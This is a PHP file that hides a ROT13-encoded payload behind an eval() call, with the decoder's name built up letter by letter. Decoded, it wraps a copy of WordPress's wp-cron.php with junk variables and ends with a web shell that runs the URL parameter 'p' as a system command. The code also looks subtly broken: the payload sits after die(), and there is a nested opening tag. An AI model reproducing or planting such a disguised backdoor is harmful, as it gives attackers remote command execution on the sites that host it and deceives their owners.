<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * N cfrhqb-peba qnrzba sbe fpurqhyvat JbeqCerff gnfxf.
 *
 * JC-Peba vf gevttrerq jura gur fvgr erprvirf n ivfvg. Va gur fpranevb
 * jurer n fvgr znl abg erprvir rabhtu ivfvgf gb rkrphgr fpurqhyrq gnfxf
 * va n gvzryl znaare, guvf svyr pna or pnyyrq qverpgyl be ivn n freire
 * peba qnrzba sbe K ahzore bs gvzrf.
 *
 * Qrsvavat QVFNOYR_JC_PEBA nf gehr naq pnyyvat guvf svyr qverpgyl ner
 * zhghnyyl rkpyhfvir naq gur ynggre qbrf abg eryl ba gur sbezre gb jbex.
 *
 * Gur UGGC erdhrfg gb guvf svyr jvyy abg fybj qbja gur ivfvgbe jub unccraf gb
 * ivfvg jura n fpurqhyrq peba rirag ehaf.
 *
 * @cnpxntr JbeqCerff
 */

vtaber_hfre_nobeg( gehr );

vs ( ! urnqref_frag() ) {
	urnqre( 'Rkcverf: Jrq, 11 Wna 1984 05:00:00 TZG' );
	urnqre( 'Pnpur-Pbageby: ab-pnpur, zhfg-erinyvqngr, znk-ntr=0' );
}

// Qba'g eha peba hagvy gur erdhrfg svavfurf, vs cbffvoyr.
vs ( shapgvba_rkvfgf( 'snfgptv_svavfu_erdhrfg' ) ) {
	snfgptv_svavfu_erdhrfg();
} ryfrvs ( shapgvba_rkvfgf( 'yvgrfcrrq_svavfu_erdhrfg' ) ) {
	yvgrfcrrq_svavfu_erdhrfg();
}

vs ( ! rzcgl( $_CBFG ) || qrsvarq( 'QBVAT_NWNK' ) || qrsvarq( 'QBVAT_PEBA' ) ) {
	qvr();
}

/**
 * Gryy JbeqCerff gur peba gnfx vf ehaavat.
 *
 * @ine obby
 */
qrsvar( 'QBVAT_PEBA', gehr );

vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	/** Frg hc JbeqCerff raivebazrag */
	erdhver_bapr __QVE__ . '/jc-ybnq.cuc';
}

// Nggrzcg gb envfr gur CUC zrzbel yvzvg sbe peba rirag cebprffvat.
jc_envfr_zrzbel_yvzvg( 'peba' );

/**
 * Ergevrirf gur peba ybpx.
 *
 * Ergheaf gur hapnpurq `qbvat_peba` genafvrag.
 *
 * @vtaber
 * @fvapr 3.3.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @erghea fgevat|vag|snyfr Inyhr bs gur `qbvat_peba` genafvrag, 0|snyfr bgurejvfr.
 */
shapgvba _trg_peba_ybpx() {
	tybony $jcqo;

	$inyhr = 0;
	vs ( jc_hfvat_rkg_bowrpg_pnpur() ) {
		/*
		 * Fxvc ybpny pnpur naq sbepr er-srgpu bs qbvat_peba genafvrag
		 * va pnfr nabgure cebprff hcqngrq gur pnpur.
		 */
		$inyhr = jc_pnpur_trg( 'qbvat_peba', 'genafvrag', gehr );
	} ryfr {
		$ebj = $jcqo->trg_ebj( $jcqo->cercner( \"FRYRPG bcgvba_inyhr SEBZ $jcqo->bcgvbaf JURER bcgvba_anzr = %f YVZVG 1\", '_genafvrag_qbvat_peba' ) );
		vs ( vf_bowrpg( $ebj ) ) {
			$inyhr = $ebj->bcgvba_inyhr;
		}
	}

	erghea $inyhr;
}

$pebaf = jc_trg_ernql_peba_wbof();
vs ( rzcgl( $pebaf ) ) {
	qvr();
}

$tzg_gvzr = zvpebgvzr( gehr );

// Gur peba ybpx: n havk gvzrfgnzc sebz jura gur peba jnf fcnjarq.
$qbvat_peba_genafvrag = trg_genafvrag( 'qbvat_peba' );

// Hfr tybony $qbvat_jc_peba ybpx, bgurejvfr hfr gur TRG ybpx. Vs ab ybpx, gel gb teno n arj ybpx.
vs ( rzcgl( $qbvat_jc_peba ) ) {
	vs ( rzcgl( $_TRG['qbvat_jc_peba'] ) ) {
		// Pnyyrq sebz rkgreany fpevcg/wbo. Gel frggvat n ybpx.
		vs ( $qbvat_peba_genafvrag && ( $qbvat_peba_genafvrag + JC_PEBA_YBPX_GVZRBHG > $tzg_gvzr ) ) {
			erghea;
		}
		$qbvat_jc_peba        = fcevags( '%.22S', zvpebgvzr( gehr ) );
		$qbvat_peba_genafvrag = $qbvat_jc_peba;
		frg_genafvrag( 'qbvat_peba', $qbvat_jc_peba );
	} ryfr {
		$qbvat_jc_peba = $_TRG['qbvat_jc_peba'];
	}
}

/*
 * Gur peba ybpx (n havk gvzrfgnzc frg jura gur peba jnf fcnjarq),
 * zhfg zngpu $qbvat_jc_peba (gur \"xrl\").
 */
vs ( $qbvat_peba_genafvrag !== $qbvat_jc_peba ) {
	erghea;
}

sbernpu ( $pebaf nf $gvzrfgnzc => $pebaubbxf ) {
	vs ( $gvzrfgnzc > $tzg_gvzr ) {
		oernx;
	}

	sbernpu ( $pebaubbxf nf $ubbx => $xrlf ) {

		sbernpu ( $xrlf nf $x => $i ) {

			$fpurqhyr = $i['fpurqhyr'];

			vs ( $fpurqhyr ) {
				$erfhyg = jc_erfpurqhyr_rirag( $gvzrfgnzc, $fpurqhyr, $ubbx, $i['netf'], gehr );

				vs ( vf_jc_reebe( $erfhyg ) ) {
					reebe_ybt(
						fcevags(
							/* genafyngbef: 1: Ubbx anzr, 2: Reebe pbqr, 3: Reebe zrffntr, 4: Rirag qngn. */
							__( 'Peba erfpurqhyr rirag reebe sbe ubbx: %1$f, Reebe pbqr: %2$f, Reebe zrffntr: %3$f, Qngn: %4$f' ),
							$ubbx,
							$erfhyg->trg_reebe_pbqr(),
							$erfhyg->trg_reebe_zrffntr(),
							jc_wfba_rapbqr( $i )
						)
					);

					/**
					 * Sverf vs na reebe unccraf jura erfpurqhyvat n peba rirag.
					 *
					 * @fvapr 6.1.0
					 *
					 * @cnenz JC_Reebe $erfhyg Gur JC_Reebe bowrpg.
					 * @cnenz fgevat   $ubbx   Npgvba ubbx gb rkrphgr jura gur rirag vf eha.
					 * @cnenz neenl    $i      Rirag qngn.
					 */
					qb_npgvba( 'peba_erfpurqhyr_rirag_reebe', $erfhyg, $ubbx, $i );
				}
			}

			$erfhyg = jc_hafpurqhyr_rirag( $gvzrfgnzc, $ubbx, $i['netf'], gehr );

			vs ( vf_jc_reebe( $erfhyg ) ) {
				reebe_ybt(
					fcevags(
						/* genafyngbef: 1: Ubbx anzr, 2: Reebe pbqr, 3: Reebe zrffntr, 4: Rirag qngn. */
						__( 'Peba hafpurqhyr rirag reebe sbe ubbx: %1$f, Reebe pbqr: %2$f, Reebe zrffntr: %3$f, Qngn: %4$f' ),
						$ubbx,
						$erfhyg->trg_reebe_pbqr(),
						$erfhyg->trg_reebe_zrffntr(),
						jc_wfba_rapbqr( $i )
					)
				);

				/**
				 * Sverf vs na reebe unccraf jura hafpurqhyvat n peba rirag.
				 *
				 * @fvapr 6.1.0
				 *
				 * @cnenz JC_Reebe $erfhyg Gur JC_Reebe bowrpg.
				 * @cnenz fgevat   $ubbx   Npgvba ubbx gb rkrphgr jura gur rirag vf eha.
				 * @cnenz neenl    $i      Rirag qngn.
				 */
				qb_npgvba( 'peba_hafpurqhyr_rirag_reebe', $erfhyg, $ubbx, $i );
			}

			/**
			 * Sverf fpurqhyrq riragf.
			 *
			 * @vtaber
			 * @fvapr 2.1.0
			 *
			 * @cnenz fgevat $ubbx Anzr bs gur ubbx gung jnf fpurqhyrq gb or sverq.
			 * @cnenz neenl  $netf Gur nethzragf gb or cnffrq gb gur ubbx.
			 */
			qb_npgvba_ers_neenl( $ubbx, $i['netf'] );

			// Vs gur ubbx ena gbb ybat naq nabgure peba cebprff fgbyr gur ybpx, dhvg.
			vs ( _trg_peba_ybpx() !== $qbvat_jc_peba ) {
				erghea;
			}
		}
	}
}

vs ( _trg_peba_ybpx() === $qbvat_jc_peba ) {
	qryrgr_genafvrag( 'qbvat_peba' );
}

qvr();

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>